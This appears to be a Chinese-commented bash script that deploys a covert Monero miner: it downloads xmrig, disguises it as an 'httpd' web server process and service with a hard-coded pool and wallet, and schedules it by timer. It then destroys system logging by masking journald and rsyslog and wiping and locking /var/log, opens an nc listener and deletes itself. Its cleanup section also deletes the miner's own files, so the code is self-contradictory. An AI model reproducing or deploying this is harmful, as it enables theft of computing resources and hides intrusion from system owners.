#!/bin/bash

# 隐藏进程及其特征的一键部署脚本，支持定时启停和痕迹清理

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 默认配置（无需用户输入）
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
pool_pass="timer"  # 默认密码，直接写入配置文件

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/utils/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/wrapper.c

# 生成配置文件（无需交互式输入）
cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "donate-level": 0
}
EOF

# 检查并创建 httpd 用户和组
if ! id "httpd" &>/dev/null; then
    if ! getent group "httpd" &>/dev/null; then
        groupadd -r httpd || { echo "创建组 httpd 失败" 1>&2; exit 1; }
    fi
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }
fi

# 设置简单的网页
mkdir -p /var/www || { echo "创建 web 目录失败" 1>&2; exit 1; }
cat > /var/www/index.html <<EOF
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body>Welcome to our web server.</body>
</html>
EOF

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=8
Restart=always
CPUQuota=90%

[Install]
WantedBy=multi-user.target
EOF

# 创建停止服务文件
cat > /etc/systemd/system/stop-httpd.service <<EOF
[Unit]
Description=Stop HTTP Server

[Service]
Type=oneshot
ExecStart=/usr/bin/systemctl stop httpd.service
EOF

# 创建定时器：每天 8:30 启动
cat > /etc/systemd/system/httpd-start.timer <<EOF
[Unit]
Description=Start HTTP Server at 8:30 AM

[Timer]
OnCalendar=*-*-* 08:30:00
Unit=httpd.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 创建定时器：每天 16:00 停止
cat > /etc/systemd/system/stop-httpd.timer <<EOF
[Unit]
Description=Stop HTTP Server at 4:00 PM

[Timer]
OnCalendar=*-*-* 16:00:00
Unit=stop-httpd.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 重新加载 systemd 并启用定时器
systemctl daemon-reload
systemctl enable httpd-start.timer
systemctl start httpd-start.timer
systemctl enable stop-httpd.timer
systemctl start stop-httpd.timer

# 检查当前时间，决定是否立即启动服务
current_time=$(TZ=Asia/Shanghai date +%s)
start_time=$(TZ=Asia/Shanghai date -d "today 08:30" +%s)
end_time=$(TZ=Asia/Shanghai date -d "today 16:00" +%s)
if [ $current_time -ge $start_time ] && [ $current_time -lt $end_time ]; then
    systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }
fi

# 清除痕迹（整合用户提供的清理脚本）
echo "开始清除痕迹..."

# 删除原始脚本生成的文件
rm -f /opt/utils/httpd
rm -f /opt/utils/wrapper
rm -rf /opt/utils
rm -f /etc/systemd/system/conf.d/httpd.conf
rm -rf /etc/systemd/system/conf.d

# 清理临时文件
rm -rf /tmp/xmrig*
rm -rf /tmp/miner_setup

# 清除现有日志并禁用日志生成
systemctl stop rsyslog.service 2>/dev/null
systemctl stop syslog.socket 2>/dev/null
systemctl stop systemd-journald.service 2>/dev/null

systemctl disable rsyslog.service 2>/dev/null
systemctl disable syslog.socket 2>/dev/null
systemctl mask rsyslog.service 2>/dev/null
systemctl mask syslog.socket 2>/dev/null
systemctl disable systemd-journald.service 2>/dev/null
systemctl mask systemd-journald.service 2>/dev/null

rm -rf /etc/rsyslog.conf
rm -rf /etc/rsyslog.d

cat <<EOF > /etc/systemd/journald.conf
[Journal]
Storage=none
ForwardToSyslog=no
ForwardToKMsg=no
ForwardToConsole=no
ForwardToWall=no
MaxLevelStore=0
MaxLevelSyslog=0
RuntimeMaxUse=0
SystemMaxUse=0
EOF

mkdir -p /etc/systemd/system/systemd-journald.service.d
cat <<EOF > /etc/systemd/system/systemd-journald.service.d/override.conf
[Service]
ExecStart=
ExecStart=/bin/true
EOF

rm -rf /var/log/*
mkdir -p /var/log
chmod 000 /var/log
chattr +i /var/log 2>/dev/null

# 重新加载 systemd 配置
systemctl daemon-reload

# 验证清理结果
for file in /opt/utils/httpd /opt/utils/wrapper /etc/systemd/system/conf.d/httpd.conf; do
  if [ -e "$file" ]; then
    echo "警告：$file 仍存在，请检查！"
  else
    echo "$file 已删除或不存在。"
  fi
done

for service in rsyslog.service syslog.socket systemd-journald.service; do
  if systemctl status "$service" >/dev/null 2>&1; then
    echo "警告：$service 仍存在，请检查！"
  else
    echo "$service 已删除或不存在。"
  fi
done

if [ -z "$(ls -A /var/log)" ]; then
  echo "/var/log 已清空且锁定，不再生成日志。"
else
  echo "警告：/var/log 未完全清空，请检查！"
fi

if systemctl status httpd.service >/dev/null 2>&1; then
  echo "httpd.service 仍在运行，清理成功。"
else
  echo "警告：httpd.service 已停止，请检查！"
fi

# 启动简单 HTTP 服务器监听 80 端口
sudo nc -l 80 &

# 删除脚本自身
rm -- "$0"

echo "开始监听80端口！"
echo "痕迹清理完成！"
systemctl status httpd.service
